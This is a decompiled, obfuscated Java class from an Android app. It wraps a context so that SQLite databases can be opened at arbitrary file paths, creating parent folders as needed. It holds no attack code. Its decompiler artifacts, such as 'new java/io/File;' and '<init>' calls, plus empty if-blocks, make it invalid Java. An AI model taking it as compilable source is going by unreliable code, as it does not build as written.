package com.vvt.datadeliverymanager.b.a;

import android.content.Context;
import android.content.ContextWrapper;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteDatabase.CursorFactory;
import java.io.File;

class a
  extends ContextWrapper
{
  private static final boolean a;
  
  static
  {
    boolean bool = com.vvt.datadeliverymanager.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      return;
    }
  }
  
  public a(Context paramContext)
  {
    super(paramContext);
  }
  
  public File getDatabasePath(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    File localFile1 = new java/io/File;
    localFile1.<init>(paramString);
    File localFile2 = localFile1.getParentFile();
    boolean bool2 = localFile2.exists();
    if (!bool2)
    {
      localFile2 = localFile1.getParentFile();
      localFile2.mkdirs();
    }
    bool2 = a;
    if (bool2) {}
    return localFile1;
  }
  
  public SQLiteDatabase openOrCreateDatabase(String paramString, int paramInt, SQLiteDatabase.CursorFactory paramCursorFactory)
  {
    SQLiteDatabase localSQLiteDatabase = SQLiteDatabase.openOrCreateDatabase(getDatabasePath(paramString), null);
    boolean bool = a;
    if (bool) {}
    return localSQLiteDatabase;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/datadeliverymanager/removeFromPath/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */